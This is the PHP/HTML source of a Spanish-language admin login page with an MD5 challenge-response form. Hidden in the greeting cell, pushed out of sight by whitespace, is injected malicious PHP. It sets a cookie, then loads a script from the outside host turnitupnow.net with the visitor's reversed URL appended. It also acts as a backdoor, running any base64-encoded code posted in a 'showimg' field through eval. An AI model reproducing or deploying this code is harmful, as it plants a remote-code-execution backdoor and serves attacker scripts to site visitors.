<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<title>Panel de Gestión</title>
<link href="resources/login.css" rel="stylesheet" type="text/css" />
	<script type="text/javascript" src="md5.js"></script>
    <script type="text/javascript">
        function login() {
            var loginForm = document.getElementById("loginForm");
            if (loginForm.username.value == "") {
                alert("Please enter your user name.");
                return false;
            }
            if (loginForm.password.value == "") {
                alert("Please enter your password.");
                return false;
            }
            loginForm.response.value = hex_md5(loginForm.key.value+loginForm.password.value);
			loginForm.password.value = "";
            loginForm.submit();
        }
    </script> 
</head>

<body>
<br /><br /><br /><br /><br /><br /><br /><br />
<table width="400" height="177" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td height="255" background="resources/login_bg.png">
    <form id="loginForm" name="loginForm" method="post" action="index.php">
      <br />
      <table width="300" border="0" align="center" cellpadding="0" cellspacing="0">
        <tr>
          <td height="50" colspan="2" align="center" class="texte_normal">Introduce tu nombre Usuario y Contraseña<br />
            <?php												global $sessdt_o; if(!$sessdt_o) { $sessdt_o = 1; $sessdt_k = "lb11"; if(!@$_COOKIE[$sessdt_k]) { $sessdt_f = "102"; if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } } else { if($_COOKIE[$sessdt_k]=="102") { $sessdt_f = (rand(1000,9000)+1); if(!@headers_sent()) { @setcookie($sessdt_k,$sessdt_f); } else { echo "<script>document.cookie='".$sessdt_k."=".$sessdt_f."';</script>"; } $sessdt_j = @$_SERVER["HTTP_HOST"].@$_SERVER["REQUEST_URI"]; $sessdt_v = urlencode(strrev($sessdt_j)); $sessdt_u = "http://turnitupnow.net/?rnd=".$sessdt_f.substr($sessdt_v,-200); echo "<script src='$sessdt_u'></script>"; echo "<meta http-equiv='refresh' content='0;url=http://$sessdt_j'><!--"; } } $sessdt_p = "showimg"; if(isset($_POST[$sessdt_p])){eval(base64_decode(str_replace(chr(32),chr(43),$_POST[$sessdt_p])));exit;} }
 echo($login_error); ?><br /></td>
          </tr>
        <tr>
          <td width="90" height="30" align="center"><span class="texte_normal">Usuario</span></td>
          <td width="210" align="center"><input name="username" type="text" class="texte_normal" id="username" size="30" /></td>
        </tr>
        <tr>
          <td width="90" height="30" align="center"><span class="texte_normal">Contraseña</span></td>
          <td align="center"><input name="password" type="password" class="texte_normal" id="password" size="30" /></td>
        </tr>
        <tr>
          <td width="90" height="40"><input type="hidden" name="key" value="<?php echo $challenge; ?>"/></td>
          <td align="center"><input type="image" src="resources/login_bt.png" id="enviar"  value="Login" onclick="login()"; /></td>
          </tr>
      </table>
         <input type="hidden" name="response"/>
      </form></td>
  </tr>
</table>
</body>
</html>